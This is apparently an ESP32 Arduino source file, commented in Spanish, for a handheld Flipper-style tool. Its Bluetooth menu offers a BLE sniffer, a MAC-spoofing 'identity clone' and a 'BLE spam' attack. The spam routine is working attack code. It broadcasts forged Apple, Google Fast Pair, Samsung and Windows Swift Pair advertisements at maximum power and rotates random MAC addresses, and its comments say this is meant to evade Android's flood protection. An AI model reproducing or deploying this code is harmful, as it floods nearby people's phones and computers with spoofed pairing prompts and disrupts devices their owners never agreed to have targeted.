#include <Arduino.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <esp_bt.h> 
#include <esp_gap_ble_api.h>
#include "bt_module.h"
#include "interface.h"
#include "joystick_module.h"

extern U8G2_SH1106_128X64_NONAME_F_HW_I2C u8g2;

// --- VARIABLES GLOBALES ---
int dispositivosEncontrados = 0;
String ultimaMacBLE = "Ninguna";

class EscanerCallbacks: public BLEAdvertisedDeviceCallbacks {
    void onResult(BLEAdvertisedDevice advertisedDevice) {
        dispositivosEncontrados++;
        ultimaMacBLE = String(advertisedDevice.getAddress().toString().c_str());
        Serial.printf("Encontrado: %s \n", ultimaMacBLE.c_str());
    }
};

void setupBluetooth() {
    Serial.println("Inicializando BLE Stack...");
    BLEDevice::init("Flipper_Core");
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9); // Máximo poder global
}

// Declaración adelantada de la función de ataque
void lanzarAtaqueSpam(int tipoOS);

void flujoBluetooth(bool &dentroDeOpcion) {
    bool enMenuBT = true;
    int subIndiceBT = 0;
    const int SUB_ITEMS_BT = 4;
    String subMenuBT[SUB_ITEMS_BT] = {
        "1. Sniffer BLE", 
        "2. Menu BLE Spam", 
        "3. Identity Clone", 
        "4. Salir"
    };

    while (enMenuBT) {
        dibujarPantalla(subIndiceBT, false, subMenuBT, SUB_ITEMS_BT);

        int valorY = analogRead(35);
        if (valorY < 1000) { if (subIndiceBT > 0) subIndiceBT--; delay(150); }
        if (valorY > 3000) { if (subIndiceBT < SUB_ITEMS_BT - 1) subIndiceBT++; delay(150); }

        if (digitalRead(32) == LOW) {
            delay(200); 
            if (subIndiceBT == 0) scanBLENetworks();
            else if (subIndiceBT == 1) bleSpamReal(); 
            else if (subIndiceBT == 2) macSpoofingReal();
            else if (subIndiceBT == 3) enMenuBT = false; 
        }
    }
    dentroDeOpcion = false;
}

// ========================================================
// 1. SNIFFER BLE (Cero Congelamiento)
// ========================================================
void scanBLENetworks() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_ncenB08_tr);
    u8g2.drawStr(0, 20, "Iniciando BLE...");
    u8g2.sendBuffer();
    
    delay(500);

    dispositivosEncontrados = 0;
    ultimaMacBLE = "---";

    BLEScan* pBLEScan = BLEDevice::getScan();
    pBLEScan->setAdvertisedDeviceCallbacks(new EscanerCallbacks());
    pBLEScan->setActiveScan(true); 
    pBLEScan->setInterval(100);
    pBLEScan->setWindow(99);

    pBLEScan->start(0, nullptr, false); 

    bool escaneando = true;
    unsigned long ultimaAct = millis();

    while(escaneando) {
        if (millis() - ultimaAct > 1000) {
            u8g2.clearBuffer();
            u8g2.setFont(u8g2_font_6x12_tr);
            u8g2.setCursor(0, 15); u8g2.print("Rastreando BLE...");
            u8g2.setCursor(0, 35); u8g2.print("Pkts: " + String(dispositivosEncontrados));
            u8g2.setCursor(0, 48); u8g2.print(ultimaMacBLE);
            u8g2.setCursor(0, 62); u8g2.print("Click = SALIR");
            u8g2.sendBuffer();
            ultimaAct = millis();
        }
        if (digitalRead(32) == LOW) {
            delay(200);
            escaneando = false;
        }
        delay(10);
    }
    pBLEScan->stop();
    pBLEScan->clearResults();
}

// ========================================================
// 2. SUBMENÚ DE BLE SPAM
// ========================================================
void bleSpamReal() {
    delay(500); // Anti-rebote al entrar
    bool enMenuSpam = true;
    int subIndiceSpam = 0;
    const int SUB_ITEMS_SPAM = 4;
    String subMenuSpam[SUB_ITEMS_SPAM] = {
        "1. Apple iOS",
        "2. Android (FastPair)",
        "3. Windows (Swift)",
        "4. Regresar"
    };

    while (enMenuSpam) {
        dibujarPantalla(subIndiceSpam, false, subMenuSpam, SUB_ITEMS_SPAM);

        int valorY = analogRead(35);
        if (valorY < 1000) { if (subIndiceSpam > 0) subIndiceSpam--; delay(150); }
        if (valorY > 3000) { if (subIndiceSpam < SUB_ITEMS_SPAM - 1) subIndiceSpam++; delay(150); }

        if (digitalRead(32) == LOW) {
            delay(200);
            if (subIndiceSpam == 3) {
                enMenuSpam = false; 
            } else {
                lanzarAtaqueSpam(subIndiceSpam);
            }
        }
    }
}

// ========================================================
// LÓGICA MAESTRA DE INYECCIÓN (Con Evasión Anti-Filtro)
// ========================================================
void lanzarAtaqueSpam(int tipoOS) {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_ncenB08_tr);
    if(tipoOS == 0) u8g2.drawStr(0, 20, "Atacando: iOS");
    if(tipoOS == 1) u8g2.drawStr(0, 20, "Atacando: Android");
    if(tipoOS == 2) u8g2.drawStr(0, 20, "Atacando: Windows");
    
    u8g2.setFont(u8g2_font_6x12_tr);
    u8g2.drawStr(0, 45, "Fuego a discrecion");
    u8g2.drawStr(0, 60, "Click = DETENER");
    u8g2.sendBuffer();

    delay(500); 

    // Obligatorio para Android: La MAC debe ser Random Static (empezar con bit 11)
    uint8_t macFalsa[6] = {0x11, 0x22, 0x33, 0x44, 0x55, 0x66};
    macFalsa[0] |= 0xC0; 
    esp_ble_gap_set_rand_addr(macFalsa);

    // Si es Android, disparamos un poco más lento (0x80) para no activar el Flood Protection de Google
    uint16_t intervalo = (tipoOS == 1) ? 0x80 : 0x20; 

    esp_ble_adv_params_t adv_params = {
        .adv_int_min        = intervalo, 
        .adv_int_max        = intervalo,
        .adv_type           = ADV_TYPE_NONCONN_IND, 
        .own_addr_type      = BLE_ADDR_TYPE_RANDOM, 
        .peer_addr          = {0},
        .peer_addr_type     = BLE_ADDR_TYPE_PUBLIC,
        .channel_map        = ADV_CHNL_ALL,
        .adv_filter_policy  = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
    };

    // --- CARGAS ÚTILES ---
    uint8_t payloadApple[] = { 0x02, 0x01, 0x1A, 0x1B, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC1, 0x01, 0x60, 0x4C, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
    uint8_t payloadWin[] = { 0x02, 0x01, 0x1A, 0x06, 0xFF, 0x06, 0x00, 0x03, 0x00, 0x80 };
    uint8_t payloadAndroid1[] = { 0x02, 0x01, 0x1A, 0x03, 0x03, 0x2C, 0xFE, 0x06, 0x16, 0x2C, 0xFE, 0x8A, 0x13, 0x2E }; // Google Pixel Buds
    uint8_t payloadSamsung[] = { 0x02, 0x01, 0x18, 0x15, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, 0x42, 0x45, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }; // Galaxy Buds

    if(tipoOS == 0) esp_ble_gap_config_adv_data_raw(payloadApple, sizeof(payloadApple));
    if(tipoOS == 2) esp_ble_gap_config_adv_data_raw(payloadWin, sizeof(payloadWin));

    delay(50);
    esp_ble_gap_start_advertising(&adv_params);

    bool atacando = true;
    int contadorRotacion = 0;
    bool turnoSamsung = false;

    while(atacando) {
        if (digitalRead(32) == LOW) {
            delay(200);
            atacando = false;
        }
        delay(10); 

        // Lógica Exclusiva para evadir defensas de Android
        if (tipoOS == 1) {
            contadorRotacion++;
            // Rotamos la MAC cada ~800ms
            if (contadorRotacion > 80) { 
                esp_ble_gap_stop_advertising();
                
                macFalsa[3] = random(256);
                macFalsa[4] = random(256);
                macFalsa[5] = random(256);
                esp_ble_gap_set_rand_addr(macFalsa);
                
                // Alternamos entre protocolo de Google y Samsung
                if (turnoSamsung) {
                    esp_ble_gap_config_adv_data_raw(payloadSamsung, sizeof(payloadSamsung));
                } else {
                    esp_ble_gap_config_adv_data_raw(payloadAndroid1, sizeof(payloadAndroid1));
                }
                turnoSamsung = !turnoSamsung;

                esp_ble_gap_start_advertising(&adv_params);
                contadorRotacion = 0;
            }
        } else {
            // Rotación estándar para Apple y Windows
            contadorRotacion++;
            if (contadorRotacion > 50) { 
                esp_ble_gap_stop_advertising();
                macFalsa[3] = random(256);
                macFalsa[4] = random(256);
                macFalsa[5] = random(256);
                esp_ble_gap_set_rand_addr(macFalsa);
                esp_ble_gap_start_advertising(&adv_params);
                contadorRotacion = 0;
            }
        }
    }

    esp_ble_gap_stop_advertising(); 
}

// ========================================================
// 3. IDENTITY CLONE (MAC Spoofing)
// ========================================================
void macSpoofingReal() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_ncenB08_tr);
    u8g2.drawStr(0, 15, "IDENTITY CLONE");
    u8g2.setFont(u8g2_font_6x12_tr);
    u8g2.drawStr(0, 30, "Emitiendo MAC Falsa:");
    u8g2.drawStr(0, 45, "11:22:33:44:55:66");
    u8g2.drawStr(0, 60, "Click = DETENER");
    u8g2.sendBuffer();

    delay(500); 

    uint8_t macFalsa[6] = {0x11, 0x22, 0x33, 0x44, 0x55, 0x66};
    esp_ble_gap_set_rand_addr(macFalsa);

    esp_ble_adv_params_t adv_params = {
        .adv_int_min        = 0x40,
        .adv_int_max        = 0x60,
        .adv_type           = ADV_TYPE_IND,
        .own_addr_type      = BLE_ADDR_TYPE_RANDOM, 
        .peer_addr          = {0},
        .peer_addr_type     = BLE_ADDR_TYPE_PUBLIC,
        .channel_map        = ADV_CHNL_ALL,
        .adv_filter_policy  = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
    };

    uint8_t payloadSpoof[] = { 0x02, 0x01, 0x06, 0x0D, 0x09, 'F','l','i','p','p','e','r','_','C','l','o','n' };

    esp_ble_gap_config_adv_data_raw(payloadSpoof, sizeof(payloadSpoof));
    delay(10);
    esp_ble_gap_start_advertising(&adv_params);

    bool clonando = true;
    while(clonando) {
        if (digitalRead(32) == LOW) {
            delay(200);
            clonando = false;
        }
        delay(50);
    }
    esp_ble_gap_stop_advertising();
}